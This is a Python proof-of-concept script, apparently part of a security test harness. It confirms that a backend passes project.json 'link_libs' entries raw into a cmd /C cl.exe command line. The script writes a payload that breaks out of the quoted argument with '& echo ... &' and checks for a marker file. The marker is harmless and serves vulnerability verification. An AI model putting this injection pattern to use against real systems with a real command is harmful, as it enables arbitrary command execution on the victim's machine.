"""H1 PoC — command injection via project.json `link_libs`.

is_safe_path() (xi_script_compiler.hpp:443-447) validates source_path /
output_dir / include_dir / extra_sources / include_dirs — but NOT link_libs,
which is concatenated raw into the cl.exe command line (:620-623):
    for (auto& l : req.link_libs) cmd += " \"" + l + "\"";
The whole compile runs as `cmd /C "... cl ... \"<link_lib>\" ..."`, so a
link_lib value that closes the quote and adds `& <cmd>` runs an arbitrary
command. We use a harmless marker (echo > h1_marker.txt) as the payload.

Verdict: marker file appears after the (failed) compile -> H1 CONFIRMED.
"""
from __future__ import annotations
import json, sys, time
from pathlib import Path
from harness import (ROOT, REPO_ROOT, BACKEND_EXE, port_open, safe_kill,
                     spawn_backend, wait_log, read_log, PORT_UP_BUDGET)

PROJ = ROOT / "h1_proj"
MARKER = ROOT / "h1_marker.txt"
PORT = 7903


def main() -> int:
    if not BACKEND_EXE.exists():
        print("SKIP: backend exe missing"); return 0
    if port_open(PORT):
        print(f"FAIL: :{PORT} already in use"); return 1

    # payload: break out of the quoted lib arg, run echo, reopen a quote.
    marker_win = str(MARKER)
    payload = f'nonexist.lib" & echo INJECTED_H1 > "{marker_win}" & rem "'
    proj = {"name": "h1_inject", "script": "inspect.cpp", "link_libs": [payload]}
    (PROJ / "project.json").write_text(json.dumps(proj, indent=2), encoding="utf-8")
    print(f"wrote malicious project.json link_libs = {payload!r}")

    if MARKER.exists():
        MARKER.unlink()

    log = ROOT / "h1_be.log"
    proc = spawn_backend(PORT, log, [f"--project={PROJ}", "--script=inspect.cpp"])
    try:
        # the compile will FAIL (nonexist.lib), but the injected echo runs
        # regardless. Wait for either ready or a compile-fail marker in the log.
        deadline = time.time() + PORT_UP_BUDGET
        while time.time() < deadline:
            t = read_log(log)
            if "autostart: ready" in t or "compile" in t.lower() and "fail" in t.lower():
                break
            if MARKER.exists():
                break
            time.sleep(0.4)
        time.sleep(1.0)  # let the cmd finish writing the marker

        print("\n==== H1 VERDICT ====")
        if MARKER.exists():
            content = MARKER.read_text(encoding="utf-8", errors="ignore").strip()
            print(f"marker CREATED: {MARKER}")
            print(f"marker content: {content!r}")
            print("=> H1 command-injection via link_libs CONFIRMED")
        else:
            print(f"marker NOT created at {MARKER}")
            print("=> H1 NOT reproduced (link_libs may be sanitized / quoting differs)")
            print("---- log tail ----")
            print(read_log(log)[-1200:])
        return 0
    finally:
        safe_kill(proc, "xinsp-backend.exe")


if __name__ == "__main__":
    raise SystemExit(main())
